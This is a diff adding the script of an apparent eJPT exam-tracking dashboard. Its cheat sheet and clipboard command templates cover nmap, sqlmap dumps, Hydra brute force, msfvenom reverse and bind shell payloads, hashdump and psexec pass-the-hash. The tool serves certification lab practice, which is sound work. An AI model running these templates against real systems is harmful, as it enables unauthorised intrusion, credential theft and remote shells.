+    <div class="cl"><span class="cn">5.</span> <code>curl -I http://target</code></div><div class="cl"><span class="cn">6.</span> Passive Burp spider</div>
+    <div class="cl"><span class="cn">7.</span> dirb/gobuster <code>-x php,txt,bak,conf,old</code></div>
+  </div></div>`;
+  h+=`<div class="section" id="sec-sql"><button class="section-header" onclick="tog('sec-sql')"><span class="section-arrow">▶</span> SQLMAP STAGES</button><div class="section-body">
+    <div class="cl"><span class="cn">1.</span> <code>--batch</code> → confirm injection + DBMS</div><div class="cl"><span class="cn">2.</span> <code>--dbs</code> → pick non-system db</div>
+    <div class="cl"><span class="cn">3.</span> <code>-D db --tables</code></div><div class="cl"><span class="cn">4.</span> <code>-D db -T tbl --columns</code></div>
+    <div class="cl"><span class="cn">5.</span> <code>-D db -T tbl -C col --dump</code></div>
+    <div class="cl" style="color:#f59e0b;font-size:11px;margin-top:4px">Time-based blind? Skip columns, guess: username,password,email,user,pass</div>
+  </div></div>`;
+  h+=`<div class="section" id="sec-pivot"><button class="section-header" onclick="tog('sec-pivot')"><span class="section-arrow">▶</span> PIVOT RULES</button><div class="section-body">
+    <div class="cl"><span class="cn">autoroute</span> = MSF modules ONLY</div>
+    <div class="cl"><span class="cn">portfwd</span> = external tools → <code>127.0.0.1:PORT</code></div>
+    <div class="cl"><span class="cn">bind_tcp</span> = always through pivots (reverse can't route back)</div>
+    <div class="cl"><span class="cn">SRVPORT</span> = change from 8080 if conflict</div>
+    <div class="cl"><span class="cn">session dies</span> = autoroute dies. Re-verify <code>sessions -l</code> always.</div>
+  </div></div>`;
+  return h;
+}
+
+function tog(id){const el=document.getElementById(id);el.classList.toggle("open");el.querySelector(".section-arrow").textContent=el.classList.contains("open")?"▼":"▶";}
+
+/* ================================================================ CMD TEMPLATES (Feature 3) ================================================================ */
+const CMD_TEMPLATES=[
+{cat:"Recon",label:"Nmap Full TCP",cmd:"nmap -sV -sC -Pn -p- {IP} -oN nmap_{IP}.txt"},
+{cat:"Recon",label:"Nmap Quick",cmd:"nmap -sV -Pn {IP}"},
+{cat:"Recon",label:"Nmap UDP Top 20",cmd:"nmap -sU --top-ports 20 -Pn {IP}"},
+{cat:"Recon",label:"db_nmap (MSF)",cmd:"db_nmap -sV -sC -Pn -p- {IP}"},
+{cat:"Web",label:"dirb default",cmd:"dirb http://{IP}:{PORT}/ /usr/share/wordlists/dirb/common.txt"},
+{cat:"Web",label:"gobuster dir",cmd:"gobuster dir -u http://{IP}:{PORT}/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,conf,old"},
+{cat:"Web",label:"Nikto",cmd:"nikto -h http://{IP}:{PORT}/"},
+{cat:"Web",label:"curl headers",cmd:"curl -I http://{IP}:{PORT}/"},
+{cat:"Web",label:"WPScan enum",cmd:"wpscan --url http://{IP}:{PORT}/ --enumerate u,vp,vt"},
+{cat:"Web",label:"WPScan brute",cmd:"wpscan --url http://{IP}:{PORT}/ -U {USER} -P /usr/share/wordlists/rockyou.txt"},
+{cat:"SMB",label:"enum4linux",cmd:"enum4linux -a {IP}"},
+{cat:"SMB",label:"smbclient list",cmd:"smbclient -L //{IP}/ -N"},
+{cat:"SMB",label:"smbclient connect",cmd:"smbclient //{IP}/{SHARE} -U {USER}%{PASS}"},
+{cat:"Brute",label:"Hydra SSH",cmd:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{IP}"},
+{cat:"Brute",label:"Hydra FTP",cmd:"hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ftp://{IP}"},
+{cat:"SQL",label:"SQLMap GET",cmd:"sqlmap -u 'http://{IP}:{PORT}/page?{PARAM}=1' --batch"},
+{cat:"SQL",label:"SQLMap POST",cmd:"sqlmap -u 'http://{IP}:{PORT}/page' --data='{PARAM}=val' -p {PARAM} --batch"},
+{cat:"SQL",label:"SQLMap dump",cmd:"sqlmap -u 'http://{IP}:{PORT}/page?{PARAM}=1' -D {DB} --dump --batch"},
+{cat:"SQL",label:"MySQL connect",cmd:"mysql -h {IP} -u {USER} -p{PASS}"},
+{cat:"Exploit",label:"msfvenom Linux rev",cmd:"msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf"},
+{cat:"Exploit",label:"msfvenom Win rev",cmd:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe"},
+{cat:"Exploit",label:"msfvenom PHP",cmd:"msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php"},
+{cat:"Exploit",label:"msfvenom bind (pivot)",cmd:"msfvenom -p windows/meterpreter/bind_tcp LPORT={LPORT} -f exe -o bind.exe"},
+{cat:"Post-Ex",label:"Linux priv check",cmd:"id && sudo -l && cat /etc/passwd && ps aux && find / -perm -4000 2>/dev/null && cat /etc/crontab"},
+{cat:"Post-Ex",label:"Find flags",cmd:"find / -name '*.txt' -o -name 'flag*' -o -name 'proof*' 2>/dev/null"},
+{cat:"Post-Ex",label:"Hashdump",cmd:"hashdump"},
+{cat:"Pivot",label:"autoroute add",cmd:"run autoroute -s {SUBNET}"},
+{cat:"Pivot",label:"portfwd add",cmd:"portfwd add -l {LPORT} -p {RPORT} -r {IP}"},
+{cat:"Hash",label:"John",cmd:"john --wordlist=/usr/share/wordlists/rockyou.txt {HASHFILE}"},
+{cat:"Hash",label:"hashcat",cmd:"hashcat -m {MODE} {HASHFILE} /usr/share/wordlists/rockyou.txt"},
+{cat:"Access",label:"SSH",cmd:"ssh {USER}@{IP}"},
+{cat:"Access",label:"xfreerdp",cmd:"xfreerdp /u:{USER} /p:{PASS} /v:{IP}"},
+{cat:"Access",label:"FTP",cmd:"ftp {IP}"},
+{cat:"Access",label:"psexec hash",cmd:"use exploit/windows/smb/psexec\nset RHOSTS {IP}\nset SMBUser {USER}\nset SMBPass {HASH}\nrun"},
+];
+function rCmds(){
+  const cats=[...new Set(CMD_TEMPLATES.map(t=>t.cat))];
+  let selT='<option value="">— Target —</option>';S.targets.filter(t=>t.ip).forEach(t=>{selT+=`<option value="${esc(t.ip)}">${esc(t.ip)}${t.hostname?' ('+esc(t.hostname)+')':''}</option>`;});
+  let selC='<option value="">— Cred —</option>';S.credentials.filter(c=>c.username).forEach(c=>{selC+=`<option value="${esc(c.id)}">${esc(c.username)}${c.password?' / '+esc(c.password.slice(0,12)):''}</option>`;});
+  let h=`<div style="margin-bottom:10px;"><div style="font-size:13px;font-weight:700;color:var(--cyan);letter-spacing:1px;margin-bottom:4px;">COMMAND TEMPLATES</div>
+    <div style="font-size:10px;color:var(--text-dark);line-height:1.8;">Click to copy with placeholders filled. Select target/cred to auto-fill <span style="color:var(--warn)">{IP}</span>, <span style="color:var(--warn)">{USER}</span>, <span style="color:var(--warn)">{PASS}</span>.</div></div>`;
+  h+=`<div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px;align-items:center;">
+    <select class="fi" id="cmdTgt" style="width:180px;">${selT}</select>
+    <select class="fi" id="cmdCred" style="width:200px;">${selC}</select>
+    <input class="fi" id="cmdPort" placeholder="Port" style="width:70px;" value="80">
+    <input class="fi" id="cmdLH" placeholder="LHOST" style="width:120px;">
+    <input class="fi" id="cmdLP" placeholder="LPORT" style="width:70px;" value="4444">
+  </div>`;
+  // Dynamic pivot/routing commands from live state
+  const subnets=[...new Set(S.mapNodes.map(n=>n.subnet).filter(Boolean))];
+  const activePivots=S.pivots.filter(p=>p.status==="Active");
+  if(subnets.length||activePivots.length){
+    h+=`<div style="font-size:10px;font-weight:700;color:var(--purple);letter-spacing:.5px;margin:12px 0 6px;border-bottom:1px solid var(--border);padding-bottom:4px;">LIVE PIVOT COMMANDS <span style="color:var(--text-dark);font-weight:400">(auto-generated from your map &amp; pivots)</span></div>`;
+    // autoroute for each known subnet
+    subnets.forEach(sub=>{
+      const cmd=`run autoroute -s ${sub}`;
+      h+=`<div class="cmd-tpl" onclick="navigator.clipboard.writeText('${cmd}').then(()=>flashMsg('✓ COPIED','var(--cyan)'))"><div class="cmd-tpl-label">autoroute → ${esc(sub)}</div><div class="cmd-tpl-code">${esc(cmd)}</div></div>`;
+    });
+    // portfwd for each active pivot that has a target IP
+    activePivots.forEach(p=>{
+      if(!p.session)return;
+      // Generate portfwd for common service ports on the target subnet
+      const targets=S.targets.filter(t=>t.ip&&t.ip!==p.from);
+      targets.forEach(t=>{
+        const webPorts=t.ports.filter(pt=>pt.port&&["80","443","8080","8443","3306","1433","5432","445","139"].includes(pt.port));
+        webPorts.forEach(pt=>{
+          const lp=parseInt(pt.port)+1000;
+          const cmd=`portfwd add -l ${lp} -p ${pt.port} -r ${t.ip}`;
+          const note=`sess ${p.session} → ${t.ip}:${pt.port} (${pt.service||'?'}) → local ${lp}`;
+          h+=`<div class="cmd-tpl" onclick="navigator.clipboard.writeText('${cmd}').then(()=>flashMsg('✓ COPIED','var(--cyan)'))"><div class="cmd-tpl-label">portfwd: ${esc(note)}</div><div class="cmd-tpl-code">${esc(cmd)}</div></div>`;
+        });
+      });
+    });
+    // Bind shell payloads for pivot targets
+    const pivotTargets=S.targets.filter(t=>t.status==="In Progress"||t.status==="Enumerated");
+    if(activePivots.length&&pivotTargets.length){
+      pivotTargets.forEach(t=>{
+        if(!t.ip)return;
+        const os=t.os||"";
+        if(/windows/i.test(os)){
+          const cmd=`msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_${t.ip.replace(/\./g,'_')}.exe`;
+          h+=`<div class="cmd-tpl" onclick="navigator.clipboard.writeText(\`${cmd}\`).then(()=>flashMsg('✓ COPIED','var(--cyan)'))"><div class="cmd-tpl-label">bind payload → ${esc(t.ip)} (Windows)</div><div class="cmd-tpl-code">${esc(cmd)}</div></div>`;
+        } else if(/linux/i.test(os)){
+          const cmd=`msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bind_${t.ip.replace(/\./g,'_')}.elf`;
+          h+=`<div class="cmd-tpl" onclick="navigator.clipboard.writeText(\`${cmd}\`).then(()=>flashMsg('✓ COPIED','var(--cyan)'))"><div class="cmd-tpl-label">bind payload → ${esc(t.ip)} (Linux)</div><div class="cmd-tpl-code">${esc(cmd)}</div></div>`;
+        }
+      });
+    }
+  }
+  cats.forEach(cat=>{
+    h+=`<div style="font-size:10px;font-weight:700;color:var(--text-muted);letter-spacing:.5px;margin:12px 0 6px;border-bottom:1px solid var(--border);padding-bottom:4px;">${cat.toUpperCase()}</div>`;
+    CMD_TEMPLATES.filter(t=>t.cat===cat).forEach(t=>{
+      const dc=t.cmd.replace(/\{(\w+)\}/g,'<span class="ph">{$1}</span>');
+      const cmdJson=JSON.stringify(t.cmd);
+      h+=`<div class="cmd-tpl" onclick='copyTpl(${cmdJson.replace(/'/g,"&#39;")})'><div class="cmd-tpl-label">${t.label}</div><div class="cmd-tpl-code">${dc}</div></div>`;
+    });
+  });
+  return h;
+}
+function copyTpl(raw){
+  const ip=(document.getElementById("cmdTgt")||{}).value||"{IP}";
+  const cid=(document.getElementById("cmdCred")||{}).value;
+  const port=(document.getElementById("cmdPort")||{}).value||"{PORT}";
+  const lh=(document.getElementById("cmdLH")||{}).value||"{LHOST}";
+  const lp=(document.getElementById("cmdLP")||{}).value||"{LPORT}";
+  let user="{USER}",pass="{PASS}",hash="{HASH}";
+  if(cid){const c=S.credentials.find(cr=>cr.id===cid);if(c){user=c.username||user;pass=c.password||pass;hash=c.hash||hash;}}
+  const filled=raw.replace(/\{IP\}/g,ip).replace(/\{PORT\}/g,port).replace(/\{USER\}/g,user).replace(/\{PASS\}/g,pass).replace(/\{HASH\}/g,hash).replace(/\{LHOST\}/g,lh).replace(/\{LPORT\}/g,lp).replace(/\{RPORT\}/g,port).replace(/\{SUBNET\}/g,"{SUBNET}").replace(/\{PARAM\}/g,"{PARAM}").replace(/\{DB\}/g,"{DB}").replace(/\{SHARE\}/g,"{SHARE}").replace(/\{HASHFILE\}/g,"{HASHFILE}").replace(/\{MODE\}/g,"{MODE}");
+  navigator.clipboard.writeText(filled).then(()=>flashMsg("✓ COPIED","var(--cyan)")).catch(()=>{});
+}
+
+/* ================================================================ UNDO (Feature 8) ================================================================ */
+function pushUndo(type,data,label){undoStack.push({type,data:JSON.parse(JSON.stringify(data)),label,ts:Date.now()});if(undoStack.length>20)undoStack.shift();showUndoBar();}
+function doUndo(){
+  if(!undoStack.length)return;const u=undoStack.pop();
+  if(u.type==="target")S.targets.push(u.data.item);
+  else if(u.type==="credential")S.credentials.push(u.data.item);
+  else if(u.type==="flag")S.flags.push(u.data.item);
+  else if(u.type==="pivot")S.pivots.push(u.data.item);
+  else if(u.type==="command")S.commands.push(u.data.item);
+  save();stats();tabs();render();hideUndoBar();
+}
+function showUndoBar(){
+  if(!undoStack.length){hideUndoBar();return;}const u=undoStack[undoStack.length-1];
+  document.getElementById("undoBar").innerHTML=`<div class="undo-bar"><span style="font-size:11px;color:var(--warn)">Deleted ${esc(u.label)}</span><button class="btn btn-warn" onclick="doUndo()">UNDO (Ctrl+Z)</button><button class="btn btn-danger" onclick="hideUndoBar()" style="padding:2px 6px">✕</button></div>`;
+  clearTimeout(window._undoT);window._undoT=setTimeout(hideUndoBar,8000);
+}
+function hideUndoBar(){document.getElementById("undoBar").innerHTML="";}
+
+/* ================================================================ SEARCH (Feature 6) ================================================================ */
+function matchesSearch(fields){if(!searchTerm)return false;return fields.some(f=>f&&String(f).toLowerCase().includes(searchTerm));}
+document.addEventListener("DOMContentLoaded",()=>{document.getElementById("globalSearch").addEventListener("input",e=>{debounce("search",()=>{searchTerm=e.target.value.toLowerCase().trim();render();},200);});});
+
+/* ================================================================ EXAM TIMER (Feature 1) ================================================================ */
+function renderExamTimer(){
+  const el=document.getElementById("examTimer");const t=S.examTimer;
+  if(!t||!t.start){el.innerHTML=`<span class="timer-label">EXAM</span><button class="timer-btn" onclick="startExamTimer()">START 48H</button>`;return;}
+  let elapsed=t.paused?t.elapsed:t.elapsed+(Date.now()-t.start);
+  const total=48*3600000,remaining=Math.max(0,total-elapsed),pct=remaining/total;
+  const hrs=Math.floor(remaining/3600000),mins=Math.floor((remaining%3600000)/60000),secs=Math.floor((remaining%60000)/1000);
+  const display=`${String(hrs).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+  el.innerHTML=`<span class="timer-label">${t.paused?"PAUSED":"LEFT"}</span><span class="timer-display ${pct<0.25?"crit":""}">${display}</span><button class="timer-btn" onclick="togglePauseTimer()">${t.paused?"▶":"⏸"}</button><button class="timer-btn" onclick="resetExamTimer()">↺</button>`;
+}
+function startExamTimer(){S.examTimer={start:Date.now(),paused:false,elapsed:0};save();renderExamTimer();}
+function togglePauseTimer(){const t=S.examTimer;if(t.paused){t.start=Date.now();t.paused=false;}else{t.elapsed+=Date.now()-t.start;t.paused=true;}save();renderExamTimer();}
+function resetExamTimer(){if(confirm("Reset exam timer?")){S.examTimer={start:null,paused:false,elapsed:0};save();renderExamTimer();}}
+
+/* ================================================================ PROGRESS BAR (Feature 10) ================================================================ */
+function renderProgressBar(){
+  const total=S.targets.length;if(!total){document.getElementById("progressBar").innerHTML='';return;}
+  const owned=S.targets.filter(t=>t.status==="Owned").length,ip=S.targets.filter(t=>t.status==="In Progress").length,en=total-owned-ip;
+  document.getElementById("progressBar").innerHTML=`<div class="progress-bar"><div class="seg-owned" style="width:${(owned/total*100).toFixed(1)}%"></div><div class="seg-inprog" style="width:${(ip/total*100).toFixed(1)}%"></div><div class="seg-enum" style="width:${(en/total*100).toFixed(1)}%"></div></div><span class="progress-label">${owned}/${total}</span>`;
+}
+
+/* ================================================================ THEME (Feature 5) ================================================================ */
+function applyTheme(){
+  if(S.theme==="red"){document.body.classList.add("theme-red");document.getElementById("themeBtn").textContent="☀";}
+  else{document.body.classList.remove("theme-red");document.getElementById("themeBtn").textContent="🌙";}
+  const cvs=document.getElementById("mapCanvas");if(cvs)cvs.style.background=S.theme==="red"?"#0e0505":"#0a0f1e";
+  if(mapCtx)drawMap();
+}
+function toggleTheme(){S.theme=S.theme==="red"?"dark":"red";save();applyTheme();}
+
+/* ================================================================ SHORTCUTS (Feature 9) ================================================================ */
+function showShortcuts(){
+  const sc=[["1-9, 0","Switch tabs"],["N","Quick-add entry"],["Ctrl+S","Save"],["Ctrl+F","Search"],["Ctrl+Z","Undo delete"],["?","Shortcuts"],["Esc","Close overlays"]];
+  let h='<div class="shortcuts-overlay" onclick="closeShortcuts()"><div class="shortcuts-box" onclick="event.stopPropagation()"><h2>KEYBOARD SHORTCUTS</h2>';
+  sc.forEach(([k,d])=>{h+=`<div class="sc-row"><span class="sc-key">${k}</span><span class="sc-desc">${d}</span></div>`;});
+  h+='<div style="margin-top:14px;text-align:right"><button class="btn" onclick="closeShortcuts()">Close</button></div></div></div>';
+  document.getElementById("shortcutsOverlay").innerHTML=h;
+}
+function closeShortcuts(){document.getElementById("shortcutsOverlay").innerHTML="";}
+
+/* ================================================================ QUICK ADD (Feature 9) ================================================================ */
+function quickAdd(){
+  const fns={targets:()=>{S.targets.push({id:uid(),ip:"",hostname:"",os:"",status:"Enumerated",checks:{},timerStart:null,killChain:{},kcNotes:"",ports:[{port:"",service:"",version:"",notes:""}]})},creds:()=>{S.credentials.push({id:uid(),username:"",password:"",hash:"",source:"",worksOn:""})},flags:()=>{S.flags.push({id:uid(),question:"",answer:"",confidence:"High"})},pivots:()=>{S.pivots.push({id:uid(),from:"",to:"",subnet:"",session:"",method:"",status:"Active"})},log:()=>{S.commands.push({id:uid(),target:"",command:"",result:"",timestamp:new Date().toLocaleTimeString()})}};
+  if(fns[AT]){fns[AT]();save();stats();tabs();render();}
+}
+
+/* ================================================================ MARKDOWN EXPORT (Feature 7) ================================================================ */
+function exportMarkdown(){
+  let md=`# eJPT Exam Report\n**Generated:** ${new Date().toISOString().slice(0,19).replace('T',' ')}\n\n`;
+  md+=`## Summary\n- **Targets:** ${S.targets.length}\n- **Owned:** ${S.targets.filter(t=>t.status==="Owned").length}\n- **Credentials:** ${S.credentials.length}\n- **Flags:** ${S.flags.length}\n\n`;
+  if(S.targets.length){md+=`## Targets\n\n`;S.targets.forEach(t=>{
+    md+=`### ${t.ip||'Unknown'} ${t.hostname?'('+t.hostname+')':''}\n- **OS:** ${t.os||'Unknown'} | **Status:** ${t.status}\n`;
+    const kc=t.killChain||{};const phases=KC_PHASES.filter(p=>kc[p]==="done").join(" → ");
+    if(phases)md+=`- **Kill Chain:** ${phases}\n`;if(t.kcNotes)md+=`- **Notes:** ${t.kcNotes}\n`;
+    if(t.ports&&t.ports.some(p=>p.port)){md+=`- **Ports:**\n`;t.ports.filter(p=>p.port).forEach(p=>{md+=`  - ${p.port} ${p.service||''} ${p.version||''} ${p.notes?'— '+p.notes:''}\n`;});}md+='\n';});}
+  if(S.credentials.length){md+=`## Credentials\n\n| Username | Password | Hash | Source | Works On |\n|---|---|---|---|---|\n`;S.credentials.forEach(c=>{md+=`| ${c.username||''} | ${c.password||''} | ${c.hash?c.hash.slice(0,20)+'…':''} | ${c.source||''} | ${c.worksOn||''} |\n`;});md+='\n';}
+  if(S.flags.length){md+=`## Flags\n\n| # | Question | Answer | Confidence |\n|---|---|---|---|\n`;S.flags.forEach((f,i)=>{md+=`| ${i+1} | ${f.question||''} | ${f.answer||''} | ${f.confidence||''} |\n`;});md+='\n';}
+  if(S.pivots.length){md+=`## Pivots\n\n`;S.pivots.forEach(p=>{md+=`- **${p.from||'?'}** → **${p.subnet||'?'}** via ${p.method||'?'} (session ${p.session||'?'}) — ${p.status}\n`;});md+='\n';}
+  if(S.commands.length){md+=`## Command Log\n\n`;S.commands.forEach(c=>{md+=`**[${c.timestamp||''}] ${c.target||''}**\n\`\`\`\n${c.command||''}\n\`\`\`\n${c.result?'> '+c.result+'\n':''}\n`;});}
+  if(S.notes){md+=`## Notes\n\n${S.notes}\n`;}
+  const blob=new Blob([md],{type:"text/markdown"});const a=document.createElement("a");a.href=URL.createObjectURL(blob);a.download="ejpt-report-"+new Date().toISOString().slice(0,16).replace(/:/g,"")+".md";a.click();flashSave();
+}
+
+/* ================================================================ RESET (Clear All Data) ================================================================ */
+function resetAllData(){
+  if(!confirm("⚠ RESET ALL DATA?\n\nThis will permanently delete ALL targets, credentials, flags, pivots, commands, notes, and map data.\n\nExport your data first if you haven't already.")) return;
+  if(!confirm("FINAL CONFIRMATION\n\nType-to-confirm is not available in confirm dialogs.\nAre you ABSOLUTELY sure? This cannot be undone.")) return;
+  S={targets:[],credentials:[],flags:[],pivots:[],commands:[],notes:"",mapNodes:[],mapEdges:[],sprayMatrix:{},examTimer:{start:null,paused:false,elapsed:0},theme:S.theme};
+  undoStack=[];searchTerm="";
+  const searchEl=document.getElementById("globalSearch");if(searchEl)searchEl.value="";
+  save();tabs();render();stats();flashSave();
+}
+
+/* ================================================================ INIT ================================================================ */
+load();applyTheme();tabs();render();stats();
+setInterval(()=>{if(AT==="targets"&&S.targets.some(t=>t.status==="In Progress"&&t.timerStart))render();},15000);
+setInterval(()=>{renderExamTimer();},1000);
+setInterval(()=>save(),30000);
+window.addEventListener("beforeunload",e=>{
+  if(S.targets.length||S.credentials.length||S.flags.length||S.commands.length||S.notes){e.preventDefault();e.returnValue="";}
+});
+</script>
+</body>
+</html>
